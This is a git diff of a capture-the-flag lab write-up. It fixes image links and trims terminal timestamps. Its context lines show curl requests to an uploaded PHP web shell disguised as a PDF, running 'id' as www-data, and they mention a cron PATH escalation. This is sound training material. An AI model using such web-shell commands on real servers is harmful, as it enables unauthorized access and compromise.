@@ -62,7 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds
 
 ### Homepage
 
-![homepage]('./Machine-homepage.png')
+![homepage](Machine-homepage.png)
 
 ### Directory Scanning
 
@@ -175,7 +175,7 @@ Progress: 12442 / 175330 (7.10%)             ^C
 
 ```bash
 
-└─[$] curl 10.10.117.45/cvs/shell.pdf.php                                                                                                                                          [16:5
+└─[$] curl 10.10.117.45/cvs/shell.pdf.php                                                                                                                                          
 <pre></pre>
 boom!%                                                                                                                                                                                             
 
@@ -187,8 +187,7 @@ boom!%
 
 ```bash
 
-└─[$] curl http://10.10.117.45/cvs/shell.pdf.php\?cmd\=id                                                                                                                          [17:
-
+└─[$] curl http://10.10.117.45/cvs/shell.pdf.php\?cmd\=id                                                                                                                    
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </pre>
 boom!%
@@ -308,7 +307,7 @@ PATH=/home/lachlan/bin:/bin:/usr/bin
 
 - For better understanding you can type `tty` in your current shell and type `echo hello > /dev/pts/<shell_no>` in a new shell and you can see the hello on your current shell.
 
-![demo] ('./demo.png')
+![demo](demo.png)
 
 - Hmmmm, what next?
 - Now as we can see the `$PATH` variable is declared inside the cron file... 
